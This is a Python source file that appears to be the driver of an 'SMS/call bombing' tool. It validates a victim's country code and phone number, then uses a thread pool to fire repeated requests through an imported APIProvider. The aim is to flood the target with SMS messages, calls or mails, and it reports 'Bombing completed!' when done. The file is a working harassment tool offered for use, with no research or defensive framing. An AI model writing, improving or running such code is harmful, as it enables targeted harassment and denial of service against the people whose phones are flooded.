import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
import zipfile
from io import BytesIO

from utils.provider import APIProvider
from concurrent.futures import ThreadPoolExecutor, as_completed

min_delay = {"sms": 5, "call": 30}
max_limit = {"sms": 500, "call": 15, "mail": 200}

def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()

country_codes = readisdc()["isdcodes"]


def get_phone_info(cc, target):

    cc = format_phone(str(cc))
    target = format_phone(str(target))

    error_status = {
        "status": "Error",
        "message": "Invalid Country Code or Invalid Number!",
    }

    valid_status = {
        "status": "valid",
        "message": "Pass",
        "cc": cc,
        "target": target
    }

    if not country_codes.get(cc):
        return error_status

    if ((len(target) <= 6) or (len(target) >= 12)):
        return error_status

    return valid_status



def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    
    success, failed = 0, 0
    
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    return "Bombing limit for your target has been reached"

                if result:
                    success += 1
                else:
                    failed += 1

    result = {
        "status": "Bombing completed!",
        "sent": int(success + failed),
        "success": success,
        "failed": failed
    }
    return result



def selectnode(cc, target, count, delay, mode):

    mode = mode.lower().strip()

    threads = (count//10) if (count//10) > 0 else 1
    
    if mode in ["sms", "call"]:

        if cc != "91":
            max_limit.update({"sms": 100})
        
            
    count = max_limit[mode] if count > max_limit[mode] else count
    delay = min_delay[mode] if delay < min_delay[mode] else delay


    result = workernode(mode, cc, target, count, delay, threads)
    return result